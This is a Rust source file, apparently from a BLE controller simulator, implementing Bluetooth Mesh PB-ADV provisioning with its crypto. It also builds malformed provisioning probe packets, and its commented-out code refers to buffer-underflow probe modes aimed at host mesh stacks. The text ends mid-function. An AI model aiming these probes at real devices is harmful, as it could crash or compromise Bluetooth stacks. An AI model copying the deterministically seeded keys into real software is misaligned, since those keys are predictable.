use aes::Aes128;
use ble::{
    hci::{
        ControllerToHostPacket,
        event::{AdvertisingReport, LeAdvertisingReportEvent, LeExtendedAdvertisingReportEvent},
        parameter::{AddrKind, BdAddr},
    },
    mesh::{MeshBeacon, NetworkPdu, PbAdvPdu, ProvisioningBearerControl, ProvisioningPdu, ProvisioningTransCont, ProvisioningTransStart},
};
use cipher::{BlockEncrypt, KeyInit, generic_array::GenericArray};
use deku::DekuContainerWrite;
use p256::{PublicKey, SecretKey, ecdh::diffie_hellman, elliptic_curve::sec1::ToEncodedPoint};
use rand::SeedableRng;
// use std::env;
use tracing::{debug, info, warn};

use crate::{Simulator, controller::ControllerError};

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ProvisioningRole {
    Unknown,
    /// Simulator initiated Link Open, so simulator behaves as provisioner.
    SimulatorProvisioner,
    /// Host initiated Link Open, so simulator behaves as provisionee/device.
    SimulatorProvisionee,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ProvisioningStage {
    Idle,
    LinkOpen,
    Invite,
    Start,
    PublicKey,
    Confirmation,
    Random,
    Data,
    Complete,
    Failed,
}

#[derive(Debug, Clone)]
struct RxProvisioningTransaction {
    link_id: u32,
    transaction_number: u8,
    total_length: usize,
    fcs: u8,
    expected_segments: usize,
    next_segment_index: u8,
    payload: Vec<u8>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
struct PendingTxAck {
    link_id: u32,
    transaction_number: u8,
}

#[derive(Debug)]
struct ProvisioningCryptoState {
    role: ProvisioningRole,
    local_private_key: [u8; 32],
    local_public_key: [u8; 64],
    peer_public_key: Option<[u8; 64]>,
    peer_public_key_little_endian: bool,
    invite_pdu: Option<Vec<u8>>,
    capabilities_pdu: Option<Vec<u8>>,
    start_pdu: Option<Vec<u8>>,
    auth_value: [u8; 16],
    ecdh_secret: Option<[u8; 32]>,
    confirmation_salt: Option<[u8; 16]>,
    confirmation_key: Option<[u8; 16]>,
    local_random: Option<[u8; 16]>,
    peer_random: Option<[u8; 16]>,
    local_confirmation: Option<[u8; 16]>,
    peer_confirmation: Option<[u8; 16]>,
    provisioning_salt: Option<[u8; 16]>,
    session_key: Option<[u8; 16]>,
    session_nonce: Option<[u8; 13]>,
    device_key: Option<[u8; 16]>,
}

#[derive(Debug)]
pub struct MeshEntity<'a> {
    simulator: &'a Simulator,
    /// Observed Mesh Unprovisioned Device beacon UUID from host advertisements (AD type 0x2B).
    unprovisioned_device_uuid: Option<[u8; 16]>,
    /// Stable synthetic PB-ADV link identifier used in mesh scan probes.
    pbadv_link_id: [u8; 4],
    /// Keep mesh PB-ADV probe reports one-shot per reset cycle.
    pbadv_probe_sent: bool,
    /// Restore packets
    packet_queue: Vec<Vec<u8>>,
    /// Addrs
    pub addr: BdAddr,
    pub addr_type: AddrKind,
    /// Stable simulator-initiated PB-ADV link id.
    link_id: u32,
    /// Local transaction number cursor for outbound PB-ADV transactions.
    transaction_number: u8,
    /// Current active PB-ADV link (host<->simulator).
    active_pbadv_link_id: Option<u32>,
    /// In-flight transaction assembled from host TransStart/TransCont.
    rx_transaction: Option<RxProvisioningTransaction>,
    /// Pending ack for simulator outbound transaction.
    pending_tx_ack: Option<PendingTxAck>,
    /// Provisioning cryptography context for current PB-ADV session.
    prov_crypto: Option<ProvisioningCryptoState>,
    /// Current provisioning role inferred from link-open direction.
    provisioning_role: ProvisioningRole,
    /// Coarse-grained provisioning stage.
    provisioning_stage: ProvisioningStage,
    /// Enable targeted mesh proxy underflow probes (BT-04).
    // mesh_proxy_underflow_mode: bool,
    /// Enable targeted mesh solicitation underflow probes (ZEP-014).
    // mesh_solicitation_underflow_mode: bool,
    /// Keep short mesh-network probe injection one-shot per reset.
    underflow_probe_sent: bool,
    /// Keep solicitation underflow probes one-shot per reset.
    solicitation_probe_sent: bool,
    /// Avoid reopening PB-ADV link for every repeated unprovisioned beacon.
    link_open_sent: bool,
}

impl<'a> MeshEntity<'a> {
    const AD_TYPE_MESH_PBADV: u8 = 0x29;
    const AD_TYPE_MESH_MESSAGE: u8 = 0x2A;
    const AD_TYPE_MESH_BEACON: u8 = 0x2B;

    const PROV_OPCODE_INVITE: u8 = 0x00;
    const PROV_OPCODE_CAPABILITIES: u8 = 0x01;
    const PROV_OPCODE_START: u8 = 0x02;
    const PROV_OPCODE_PUBLIC_KEY: u8 = 0x03;
    const PROV_OPCODE_INPUT_COMPLETE: u8 = 0x04;
    const PROV_OPCODE_CONFIRMATION: u8 = 0x05;
    const PROV_OPCODE_RANDOM: u8 = 0x06;
    const PROV_OPCODE_DATA: u8 = 0x07;
    const PROV_OPCODE_COMPLETE: u8 = 0x08;
    const PROV_OPCODE_FAILED: u8 = 0x09;

    // Keep segmentation conservative for compatibility with legacy advertising limits.
    const PB_ADV_SEGMENT_DATA_MAX: usize = 20;
    const PB_ADV_MAX_SEGMENTS: usize = 64;

    pub fn new(simulator: &'a Simulator) -> Self {
        // let att_mode = env::var("VIRTBLE_ATT_MUTATION_MODE").ok().unwrap_or_default();
        // let interaction_mode = env::var("VIRTBLE_MESH_INTERACTION_MODE").ok().unwrap_or_default();
        // let mesh_proxy_underflow_mode = env::var("VIRTBLE_ATT_MUTATION_MODE")
        //     .ok()
        //     .map(|v| v.trim().eq_ignore_ascii_case("mesh_proxy_underflow"))
        //     .unwrap_or(false)
        //     || env::var("VIRTBLE_MESH_INTERACTION_MODE")
        //         .ok()
        //         .map(|v| v.trim().eq_ignore_ascii_case("proxy_underflow"))
        //         .unwrap_or(false);
        // let mesh_solicitation_underflow_mode =
        //     att_mode.trim().eq_ignore_ascii_case("mesh_solicitation_underflow") || interaction_mode.trim().eq_ignore_ascii_case("solicitation_underflow");
        // if mesh_proxy_underflow_mode {
        //     info!("[Mesh] enable proxy-underflow interaction mode");
        // }
        // if mesh_solicitation_underflow_mode {
        //     info!("[Mesh] enable solicitation-underflow interaction mode");
        // }
        Self {
            simulator,
            unprovisioned_device_uuid: None,
            pbadv_link_id: [0x01, 0x23, 0x45, 0x67],
            pbadv_probe_sent: false,
            packet_queue: Vec::new(),
            addr: BdAddr::default(),
            addr_type: AddrKind::Public,
            link_id: 0x11223344,
            transaction_number: 0,
            active_pbadv_link_id: None,
            rx_transaction: None,
            pending_tx_ack: None,
            prov_crypto: None,
            provisioning_role: ProvisioningRole::Unknown,
            provisioning_stage: ProvisioningStage::Idle,
            // mesh_proxy_underflow_mode,
            // mesh_solicitation_underflow_mode,
            underflow_probe_sent: false,
            solicitation_probe_sent: false,
            link_open_sent: false,
        }
    }

    pub fn reset(&mut self) {
        self.unprovisioned_device_uuid = None;
        self.pbadv_probe_sent = false;
        self.packet_queue.clear();
        self.transaction_number = 0;
        self.underflow_probe_sent = false;
        self.solicitation_probe_sent = false;
        self.link_open_sent = false;
        self.reset_pbadv_session_state();
    }

    pub fn set_addr(&mut self, addr: &BdAddr, addr_type: &AddrKind) {
        self.addr = addr.clone();
        self.addr_type = addr_type.clone();
    }

    pub fn observe_ad_payload(&mut self, payload: &[u8]) -> bool {
        let mut offset = 0usize;
        let mut uuid_changed = false;
        while offset < payload.len() {
            let ad_len = payload[offset] as usize;
            offset += 1;
            if ad_len == 0 {
                break;
            }
            let ad_end = offset.saturating_add(ad_len);
            if ad_end > payload.len() {
                break;
            }
            let ad_type = payload[offset];
            let ad_data = &payload[(offset + 1)..ad_end];
            if ad_type == Self::AD_TYPE_MESH_PBADV || ad_type == Self::AD_TYPE_MESH_MESSAGE || ad_type == Self::AD_TYPE_MESH_BEACON {
                info!("found mesh payload in target");
            }
            if ad_type == Self::AD_TYPE_MESH_PBADV && ad_data.len() >= 6 {
                let link_id = u32::from_be_bytes([ad_data[0], ad_data[1], ad_data[2], ad_data[3]]);
                let txn = ad_data[4];
                let ctl = ad_data[5];
                let gpcf = ctl & 0x03;
                let seg = ctl >> 2;
                let gpcf_name = match gpcf {
                    0 => "tx_start",
                    1 => "tx_ack",
                    2 => "tx_cont",
                    3 => "bearer_ctl",
                    _ => "unknown",
                };
                if gpcf == 0 && ad_data.len() >= 9 {
                    let msg_len = u16::from_be_bytes([ad_data[6], ad_data[7]]);
                    let fcs = ad_data[8];
                    debug!(
                        "target mesh pbadv out: link=0x{link_id:08x} txn=0x{txn:02x} gpcf={gpcf_name} seg={} msg_len={} fcs=0x{fcs:02x} ad_len={}",
                        seg,
                        msg_len,
                        ad_data.len()
                    );
                } else {
                    debug!(
                        "target mesh pbadv out: link=0x{link_id:08x} txn=0x{txn:02x} gpcf={gpcf_name} seg={} ad_len={}",
                        seg,
                        ad_data.len()
                    );
                }
            }
            if ad_type == Self::AD_TYPE_MESH_BEACON && ad_data.len() >= 17 && ad_data[0] == 0x00 {
                let mut uuid = [0u8; 16];
                uuid.copy_from_slice(&ad_data[1..17]);
                if self.unprovisioned_device_uuid != Some(uuid) {
                    debug!("observed mesh unprovisioned uuid={}", hex::encode_upper(uuid));
                    uuid_changed = true;
                }
                self.unprovisioned_device_uuid = Some(uuid);
                self.pbadv_probe_sent = false;
            }
            offset = ad_end;
        }
        uuid_changed
    }

    pub fn build_extended_scan_report_payload(
        advertiser_address_type: AddrKind,
        advertising_sid: u8,
        periodic_interval: u16,
        address: [u8; 6],
        rssi: i8,
        adv_data: &[u8],
    ) -> Vec<u8> {
        let address_type = match advertiser_address_type {
            AddrKind::Public => 0x00,
            AddrKind::Random => 0x01,
            AddrKind::ResolvablePrivateOrPublic => 0x02,
            AddrKind::ResolvablePrivateOrRandom => 0x03,
            AddrKind::AnonymousAdv => 0xFF,
        };
        let data_len = adv_data.len().min(usize::from(u8::MAX));

        let mut buf = Vec::new();
        buf.extend_from_slice(&0x10u16.to_le_bytes()); // Event_Type: legacy connectable/scannable
        buf.push(address_type); // Address_Type
        buf.extend_from_slice(&address);
        buf.push(0x01); // Primary PHY
        buf.push(0x02); // Secondary PHY
        buf.push(advertising_sid); // SID
        buf.push(0x00); // Tx_Power
        buf.push(rssi as u8); // RSSI
        buf.extend_from_slice(&periodic_interval.to_le_bytes()); // Periodic Interval
        buf.push(0x00); // Direct Address Type
        buf.extend_from_slice(&[0; 6]); // Direct Address
        buf.push(data_len as u8); // Data_Length
        buf.extend_from_slice(&adv_data[..data_len]);
        buf
    }

    pub fn build_pbadv_probe_reports(
        &mut self,
        advertiser_address_type: AddrKind,
        advertising_sid: u8,
        periodic_interval: u16,
        address: [u8; 6],
        rssi: i8,
    ) -> Option<(Vec<u8>, Vec<u8>)> {
        if self.pbadv_probe_sent {
            return None;
        }
        let Some(uuid) = self.unprovisioned_device_uuid else {
            return None;
        };

        let mut link_open = Vec::with_capacity(24);
        link_open.push(23);
        link_open.push(Self::AD_TYPE_MESH_PBADV);
        link_open.extend_from_slice(&self.pbadv_link_id);
        link_open.push(0x00); // transaction number
        link_open.push(0x03); // provisioning bearer control: LINK_OPEN
        link_open.extend_from_slice(&uuid);

        let mut tx_start = vec![0u8; 48];
        tx_start[0] = 47;
        tx_start[1] = Self::AD_TYPE_MESH_PBADV;
        tx_start[2..6].copy_from_slice(&self.pbadv_link_id);
        tx_start[6] = 0x01; // transaction number
        tx_start[7] = 0x00; // GPCF: TRANSACTION_START
        tx_start[8] = 0x00; // msg_len MSB
        tx_start[9] = 0x20; // msg_len LSB
        tx_start[10] = 0x5A; // fcs
        for i in 11..tx_start.len() {
            tx_start[i] = (i & 0xFF) as u8;
        }

        let open_payload =
            Self::build_extended_scan_report_payload(advertiser_address_type.clone(), advertising_sid, periodic_interval, address, rssi, &link_open);
        let start_payload = Self::build_extended_scan_report_payload(advertiser_address_type, advertising_sid, periodic_interval, address, rssi, &tx_start);
        debug!(
            "emit mesh pbadv probe reports: open_payload_len={} start_payload_len={} uuid={}",
            open_payload.len(),
            start_payload.len(),
            hex::encode_upper(uuid)
        );
        self.pbadv_probe_sent = true;
        Some((open_payload, start_payload))
    }

    #[inline]
    fn enqueue_ad_packet(&mut self, ad_type: u8, payload: &[u8]) {
        let data_len = payload.len().min(usize::from(u8::MAX - 1));
        let mut packet = Vec::with_capacity(data_len + 2);
        packet.push((data_len as u8).saturating_add(1));
        packet.push(ad_type);
        packet.extend_from_slice(&payload[..data_len]);
        self.packet_queue.push(packet);
    }

    #[inline]
    fn next_transaction_number(&mut self) -> u8 {
        let txn = self.transaction_number;
        self.transaction_number = self.transaction_number.wrapping_add(1);
        txn
    }

    fn reset_pbadv_session_state(&mut self) {
        self.active_pbadv_link_id = None;
        self.rx_transaction = None;
        self.pending_tx_ack = None;
        self.prov_crypto = None;
        self.provisioning_role = ProvisioningRole::Unknown;
        self.provisioning_stage = ProvisioningStage::Idle;
    }

    fn enqueue_pbadv_raw(&mut self, pdu: PbAdvPdu) {
        let payload = pdu.to_bytes();
        self.enqueue_ad_packet(Self::AD_TYPE_MESH_PBADV, &payload);
    }

    fn enqueue_pbadv_control_with_txn(&mut self, link_id: u32, transaction_number: u8, control: ProvisioningBearerControl) {
        self.enqueue_pbadv_raw(PbAdvPdu {
            link_id,
            transaction_number,
            generic_prov_pdu: ProvisioningPdu::BearerControl(control),
        });
    }

    fn enqueue_pbadv_transaction_ack(&mut self, link_id: u32, transaction_number: u8) {
        self.enqueue_pbadv_raw(PbAdvPdu {
            link_id,
            transaction_number,
            generic_prov_pdu: ProvisioningPdu::TransAck,
        });
    }

    fn queue_provisioning_message(&mut self, link_id: u32, message: &[u8]) {
        if message.is_empty() {
            return;
        }

        let max_len = Self::PB_ADV_SEGMENT_DATA_MAX * Self::PB_ADV_MAX_SEGMENTS;
        let total_len = message.len().min(max_len);
        let payload = &message[..total_len];
        let seg_count = (total_len + Self::PB_ADV_SEGMENT_DATA_MAX - 1) / Self::PB_ADV_SEGMENT_DATA_MAX;
        let seg_n = (seg_count.saturating_sub(1)) as u8;
        let transaction_number = self.next_transaction_number();

        let first_end = Self::PB_ADV_SEGMENT_DATA_MAX.min(total_len);
        let start = ProvisioningTransStart {
            seg_num: seg_n,
            total_length: total_len as u16,
            fcs: Self::mesh_fcs_calc(payload),
            data: payload[..first_end].to_vec(),
        };
        self.enqueue_pbadv_raw(PbAdvPdu {
            link_id,
            transaction_number,
            generic_prov_pdu: ProvisioningPdu::TransStart(start),
        });

        for seg_idx in 1..seg_count {
            let offset = seg_idx * Self::PB_ADV_SEGMENT_DATA_MAX;
            let end = (offset + Self::PB_ADV_SEGMENT_DATA_MAX).min(total_len);
            let cont = ProvisioningTransCont {
                seg_num: seg_idx as u8,
                data: payload[offset..end].to_vec(),
            };
            self.enqueue_pbadv_raw(PbAdvPdu {
                link_id,
                transaction_number,
                generic_prov_pdu: ProvisioningPdu::TransCont(cont),
            });
        }

        self.pending_tx_ack = Some(PendingTxAck { link_id, transaction_number });
    }

    fn on_pbadv_trans_ack(&mut self, link_id: u32, transaction_number: u8) {
        if self
            .pending_tx_ack
            .is_some_and(|pending| pending.link_id == link_id && pending.transaction_number == transaction_number)
        {
            debug!("[Mesh] received PB-ADV transaction ack for link=0x{link_id:08x} txn=0x{transaction_number:02x}");
            self.pending_tx_ack = None;
        }
    }

    #[inline]
    fn mesh_crc8_update(crc: u8, octet: u8) -> u8 {
        // Reversed CRC-8 with polynomial 0x07 (same style as Zephyr bt_mesh_fcs_calc).
        let mut value = crc ^ octet;
        for _ in 0..8 {
            if (value & 0x01) != 0 {
                value = (value >> 1) ^ 0xE0;
            } else {
                value >>= 1;
            }
        }
        value
    }

    fn mesh_fcs_calc(data: &[u8]) -> u8 {
        let mut fcs = 0xffu8;
        for byte in data {
            fcs = Self::mesh_crc8_update(fcs, *byte);
        }
        0xffu8.wrapping_sub(fcs)
    }

    fn mesh_fcs_valid(data: &[u8], received_fcs: u8) -> bool {
        let mut fcs = 0xffu8;
        for byte in data {
            fcs = Self::mesh_crc8_update(fcs, *byte);
        }
        Self::mesh_crc8_update(fcs, received_fcs) == 0xcf
    }

    #[inline]
    fn provisioning_opcode_name(opcode: u8) -> &'static str {
        match opcode {
            Self::PROV_OPCODE_INVITE => "invite",
            Self::PROV_OPCODE_CAPABILITIES => "capabilities",
            Self::PROV_OPCODE_START => "start",
            Self::PROV_OPCODE_PUBLIC_KEY => "public_key",
            Self::PROV_OPCODE_INPUT_COMPLETE => "input_complete",
            Self::PROV_OPCODE_CONFIRMATION => "confirmation",
            Self::PROV_OPCODE_RANDOM => "random",
            Self::PROV_OPCODE_DATA => "data",
            Self::PROV_OPCODE_COMPLETE => "complete",
            Self::PROV_OPCODE_FAILED => "failed",
            _ => "unknown",
        }
    }

    fn deterministic_blob(link_id: u32, domain: u8, len: usize) -> Vec<u8> {
        let base = link_id.to_be_bytes();
        let mut out = Vec::with_capacity(len);
        for idx in 0..len {
            let step = (idx as u8).wrapping_mul(0x3D).wrapping_add(domain);
            out.push(base[idx % 4].wrapping_add(step));
        }
        out
    }

    fn build_invite_message() -> Vec<u8> {
        vec![Self::PROV_OPCODE_INVITE, 0x00]
    }

    fn build_capabilities_message() -> Vec<u8> {
        // Number_of_Elements=1, Algorithms=FIPS P-256, No OOB capabilities.
        vec![
            Self::PROV_OPCODE_CAPABILITIES,
            0x01, // num elements
            0x00,
            0x01, // algorithms
            0x00, // public key type
            0x00, // static OOB type
            0x00, // output OOB size
            0x00,
            0x00, // output OOB action
            0x00, // input OOB size
            0x00,
            0x00, // input OOB action
        ]
    }

    fn build_start_message() -> Vec<u8> {
        // FIPS P-256, no OOB authentication.
        vec![
            Self::PROV_OPCODE_START,
            0x00, // algorithm
            0x00, // public key
            0x00, // auth method
            0x00, // auth action
            0x00, // auth size
        ]
    }

    fn build_complete_message() -> Vec<u8> {
        vec![Self::PROV_OPCODE_COMPLETE]
    }

    fn build_failed_message(reason: u8) -> Vec<u8> {
        vec![Self::PROV_OPCODE_FAILED, reason]
    }

    fn infer_role_from_opcode(opcode: u8) -> ProvisioningRole {
        match opcode {
            Self::PROV_OPCODE_CAPABILITIES => ProvisioningRole::SimulatorProvisioner,
            Self::PROV_OPCODE_INVITE | Self::PROV_OPCODE_START | Self::PROV_OPCODE_INPUT_COMPLETE | Self::PROV_OPCODE_DATA => {
                ProvisioningRole::SimulatorProvisionee
            }
            _ => ProvisioningRole::SimulatorProvisionee,
        }
    }

    fn xor_block(a: &[u8; 16], b: &[u8; 16]) -> [u8; 16] {
        let mut out = [0u8; 16];
        for idx in 0..16 {
            out[idx] = a[idx] ^ b[idx];
        }
        out
    }

    fn aes128_encrypt_block(key: &[u8; 16], block: &[u8; 16]) -> [u8; 16] {
        let cipher = Aes128::new(GenericArray::from_slice(key));
        let mut state = GenericArray::clone_from_slice(block);
        cipher.encrypt_block(&mut state);
        let mut out = [0u8; 16];
        out.copy_from_slice(&state);
        out
    }

    fn shift_left_one_bit(input: &[u8; 16]) -> [u8; 16] {
        let mut out = [0u8; 16];
        let mut carry = 0u8;
        for idx in (0..16).rev() {
            let next_carry = (input[idx] & 0x80) >> 7;
            out[idx] = (input[idx] << 1) | carry;
            carry = next_carry;
        }
        out
    }

    fn aes_cmac(key: &[u8; 16], message: &[u8]) -> [u8; 16] {
        const RB: [u8; 16] = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0x87];

        let zero = [0u8; 16];
        let l = Self::aes128_encrypt_block(key, &zero);
        let mut k1 = Self::shift_left_one_bit(&l);
        if (l[0] & 0x80) != 0 {
            k1 = Self::xor_block(&k1, &RB);
        }
        let mut k2 = Self::shift_left_one_bit(&k1);
        if (k1[0] & 0x80) != 0 {
            k2 = Self::xor_block(&k2, &RB);
        }

        let block_count = if message.is_empty() { 1 } else { message.len().div_ceil(16) };
        let is_complete = !message.is_empty() && message.len().is_multiple_of(16);

        let mut x = [0u8; 16];
        for block_idx in 0..(block_count - 1) {
            let start = block_idx * 16;
            let mut m = [0u8; 16];
            m.copy_from_slice(&message[start..start + 16]);
            x = Self::aes128_encrypt_block(key, &Self::xor_block(&x, &m));
        }

        let mut last = [0u8; 16];
        if is_complete {
            let start = (block_count - 1) * 16;
            last.copy_from_slice(&message[start..start + 16]);
            last = Self::xor_block(&last, &k1);
        } else {
            let start = (block_count - 1) * 16;
            let remain = message.len().saturating_sub(start);
            if remain > 0 {
                last[..remain].copy_from_slice(&message[start..]);
            }
            last[remain] = 0x80;
            last = Self::xor_block(&last, &k2);
        }

        Self::aes128_encrypt_block(key, &Self::xor_block(&x, &last))
    }

    fn mesh_s1(input: &[u8]) -> [u8; 16] {
        Self::aes_cmac(&[0u8; 16], input)
    }

    fn mesh_k1(n: &[u8], salt: &[u8; 16], p: &[u8]) -> [u8; 16] {
        let t = Self::aes_cmac(salt, n);
        Self::aes_cmac(&t, p)
    }

    fn ccm_counter_block(nonce: &[u8; 13], ctr: u16) -> [u8; 16] {
        let mut block = [0u8; 16];
        block[0] = 0x01; // L=2 -> q-1 = 1
        block[1..14].copy_from_slice(nonce);
        block[14..16].copy_from_slice(&ctr.to_be_bytes());
        block
    }

    fn aes_ccm_encrypt_no_aad_mic8(key: &[u8; 16], nonce: &[u8; 13], plaintext: &[u8]) -> (Vec<u8>, [u8; 8]) {
        let mut b0 = [0u8; 16];
        b0[0] = 0x19; // no AAD, M=8, L=2
        b0[1..14].copy_from_slice(nonce);
        let msg_len = (plaintext.len() as u16).to_be_bytes();
        b0[14] = msg_len[0];
        b0[15] = msg_len[1];

        let mut x = Self::aes128_encrypt_block(key, &b0);
        for chunk in plaintext.chunks(16) {
            let mut block = [0u8; 16];
            block[..chunk.len()].copy_from_slice(chunk);
            x = Self::aes128_encrypt_block(key, &Self::xor_block(&x, &block));
        }

        let mut ciphertext = Vec::with_capacity(plaintext.len());
        for (block_idx, chunk) in plaintext.chunks(16).enumerate() {
            let s = Self::aes128_encrypt_block(key, &Self::ccm_counter_block(nonce, (block_idx + 1) as u16));
            for idx in 0..chunk.len() {
                ciphertext.push(chunk[idx] ^ s[idx]);
            }
        }

        let s0 = Self::aes128_encrypt_block(key, &Self::ccm_counter_block(nonce, 0));
        let mut mic = [0u8; 8];
        for idx in 0..8 {
            mic[idx] = x[idx] ^ s0[idx];
        }
        (ciphertext, mic)
    }

    fn aes_ccm_decrypt_no_aad_mic8(key: &[u8; 16], nonce: &[u8; 13], ciphertext: &[u8], mic: &[u8; 8]) -> Option<Vec<u8>> {
        let mut plaintext = Vec::with_capacity(ciphertext.len());
        for (block_idx, chunk) in ciphertext.chunks(16).enumerate() {
            let s = Self::aes128_encrypt_block(key, &Self::ccm_counter_block(nonce, (block_idx + 1) as u16));
            for idx in 0..chunk.len() {
                plaintext.push(chunk[idx] ^ s[idx]);
            }
        }

        let (_, expected_mic) = Self::aes_ccm_encrypt_no_aad_mic8(key, nonce, &plaintext);
        if mic != &expected_mic {
            return None;
        }
        Some(plaintext)
    }

    fn decode_wire_public_key(raw_wire: &[u8; 64]) -> Option<(PublicKey, bool)> {
        let mut sec1 = [0u8; 65];
        sec1[0] = 0x04;
        sec1[1..].copy_from_slice(raw_wire);
        if let Ok(pub_key) = PublicKey::from_sec1_bytes(&sec1) {
            return Some((pub_key, false));
        }

        let mut reversed = [0u8; 64];
        reversed[..32].copy_from_slice(&raw_wire[..32]);
        reversed[..32].reverse();
        reversed[32..].copy_from_slice(&raw_wire[32..]);
        reversed[32..].reverse();
        sec1[1..].copy_from_slice(&reversed);
        PublicKey::from_sec1_bytes(&sec1).ok().map(|k| (k, true))
    }

    fn encode_local_public_key_for_wire(local_be: &[u8; 64], peer_little_endian: bool) -> [u8; 64] {
        if !peer_little_endian {
            return *local_be;
        }
        let mut wire = *local_be;
        wire[..32].reverse();
        wire[32..].reverse();
        wire
    }

    fn init_provisioning_crypto(&mut self, role: ProvisioningRole, link_id: u32) {
        let seed = ((link_id as u64) << 32)
            ^ match role {
                ProvisioningRole::SimulatorProvisioner => 0xBEEF_A110,
                ProvisioningRole::SimulatorProvisionee => 0xC0DE_D220,
                ProvisioningRole::Unknown => 0xABCD_1234,
            };
        let mut rng = rand::rngs::StdRng::seed_from_u64(seed);
        let secret = SecretKey::random(&mut rng);
        let local_private_key = secret.to_bytes().into();
        let encoded = secret.public_key().to_encoded_point(false);
        let mut local_public_key = [0u8; 64];
        local_public_key.copy_from_slice(&encoded.as_bytes()[1..65]);
        let mut local_random = [0u8; 16];
        rand::RngCore::fill_bytes(&mut rng, &mut local_random);

        self.prov_crypto = Some(ProvisioningCryptoState {
            role,
            local_private_key,
            local_public_key,
            peer_public_key: None,
            peer_public_key_little_endian: false,
            invite_pdu: None,
            capabilities_pdu: None,
            start_pdu: None,
            auth_value: [0u8; 16],
            ecdh_secret: None,
            confirmation_salt: None,
            confirmation_key: None,
            local_random: Some(local_random),
            peer_random: None,
            local_confirmation: None,
            peer_confirmation: None,
            provisioning_salt: None,
            session_key: None,
            session_nonce: None,
            device_key: None,
        });
    }

    fn maybe_init_provisioning_crypto(&mut self, role: ProvisioningRole, link_id: u32) {
        if self.prov_crypto.is_none() {
            self.init_provisioning_crypto(role, link_id);
        }
    }

    fn try_derive_confirmation_material(state: &mut ProvisioningCryptoState) -> bool {
        let (Some(invite), Some(caps), Some(start), Some(peer_wire)) = (
            state.invite_pdu.as_ref(),
            state.capabilities_pdu.as_ref(),
            state.start_pdu.as_ref(),
            state.peer_public_key.as_ref(),
        ) else {
            return false;
        };

        let Some((peer_pub_key, peer_le)) = Self::decode_wire_public_key(peer_wire) else {
            return false;
        };
        state.peer_public_key_little_endian = peer_le;

        let mut prov_pub = [0u8; 64];
        let mut dev_pub = [0u8; 64];
        match state.role {
            ProvisioningRole::SimulatorProvisioner => {
                prov_pub.copy_from_slice(&state.local_public_key);
                dev_pub.copy_from_slice(peer_wire);
            }
            ProvisioningRole::SimulatorProvisionee => {
                prov_pub.copy_from_slice(peer_wire);
                dev_pub.copy_from_slice(&state.local_public_key);
            }
            ProvisioningRole::Unknown => return false,
        }
        if state.peer_public_key_little_endian {
            if matches!(state.role, ProvisioningRole::SimulatorProvisioner) {
                dev_pub[..32].reverse();
                dev_pub[32..].reverse();
            } else {
                prov_pub[..32].reverse();
                prov_pub[32..].reverse();
            }
        }

        let mut transcript = Vec::new();
        transcript.extend_from_slice(invite);
        transcript.extend_from_slice(caps);
        transcript.extend_from_slice(start);
        transcript.extend_from_slice(&prov_pub);
        transcript.extend_from_slice(&dev_pub);

        let Some(secret_key) = SecretKey::from_slice(&state.local_private_key).ok() else {
            return false;
        };
        let ecdh = diffie_hellman(secret_key.to_nonzero_scalar(), peer_pub_key.as_affine());
        let mut ecdh_secret = [0u8; 32];
        ecdh_secret.copy_from_slice(ecdh.raw_secret_bytes().as_slice());

        let confirmation_salt = Self::mesh_s1(&transcript);
        let confirmation_key = Self::mesh_k1(&ecdh_secret, &confirmation_salt, b"prck");

        state.ecdh_secret = Some(ecdh_secret);
        state.confirmation_salt = Some(confirmation_salt);
        state.confirmation_key = Some(confirmation_key);
        true
    }

    fn ensure_confirmation_material(&mut self) -> bool {
        let Some(state) = self.prov_crypto.as_mut() else {
            return false;
        };
        if state.confirmation_key.is_some() {
            return true;
        }
        Self::try_derive_confirmation_material(state)
    }

    fn build_public_key_message(&mut self) -> Option<Vec<u8>> {
        let state = self.prov_crypto.as_ref()?;
        let wire = Self::encode_local_public_key_for_wire(&state.local_public_key, state.peer_public_key_little_endian);
        let mut msg = vec![Self::PROV_OPCODE_PUBLIC_KEY];
        msg.extend_from_slice(&wire);
        Some(msg)
    }

    fn build_confirmation_message(&mut self) -> Option<Vec<u8>> {
        if !self.ensure_confirmation_material() {
            return None;
        }
        let state = self.prov_crypto.as_mut()?;
        let (Some(key), Some(random)) = (state.confirmation_key, state.local_random) else {
            return None;
        };
        let mut mac_input = Vec::with_capacity(32);
        mac_input.extend_from_slice(&random);
        mac_input.extend_from_slice(&state.auth_value);
        let confirmation = Self::aes_cmac(&key, &mac_input);
        state.local_confirmation = Some(confirmation);
        let mut msg = vec![Self::PROV_OPCODE_CONFIRMATION];
        msg.extend_from_slice(&confirmation);
        Some(msg)
    }

    fn build_random_message(&self) -> Option<Vec<u8>> {
        let state = self.prov_crypto.as_ref()?;
        let random = state.local_random?;
        let mut msg = vec![Self::PROV_OPCODE_RANDOM];
        msg.extend_from_slice(&random);
        Some(msg)
    }

    fn maybe_derive_session_material(state: &mut ProvisioningCryptoState) -> bool {
        let (Some(ecdh_secret), Some(conf_salt), Some(local_random), Some(peer_random)) =
            (state.ecdh_secret, state.confirmation_salt, state.local_random, state.peer_random)
        else {
            return false;
        };

        let (prov_random, dev_random) = match state.role {
            ProvisioningRole::SimulatorProvisioner => (local_random, peer_random),
            ProvisioningRole::SimulatorProvisionee => (peer_random, local_random),
            ProvisioningRole::Unknown => return false,
        };

        let mut input = Vec::with_capacity(16 + 16 + 16);
        input.extend_from_slice(&conf_salt);
        input.extend_from_slice(&prov_random);
        input.extend_from_slice(&dev_random);
        let provisioning_salt = Self::mesh_s1(&input);
        let session_key = Self::mesh_k1(&ecdh_secret, &provisioning_salt, b"prsk");
        let session_nonce_full = Self::mesh_k1(&ecdh_secret, &provisioning_salt, b"prsn");
        let mut session_nonce = [0u8; 13];
        session_nonce.copy_from_slice(&session_nonce_full[3..16]);
        let device_key = Self::mesh_k1(&ecdh_secret, &provisioning_salt, b"prdk");

        state.provisioning_salt = Some(provisioning_salt);
        state.session_key = Some(session_key);
        state.session_nonce = Some(session_nonce);
        state.device_key = Some(device_key);
        true
    }

    fn ensure_session_material(&mut self) -> bool {
        let Some(state) = self.prov_crypto.as_mut() else {
            return false;
        };
        if state.session_key.is_some() && state.session_nonce.is_some() {
            return true;
        }
        Self::maybe_derive_session_material(state)
    }

    fn build_data_message(&mut self, link_id: u32) -> Option<Vec<u8>> {
        if !self.ensure_session_material() {
            return None;
        }
        let state = self.prov_crypto.as_ref()?;
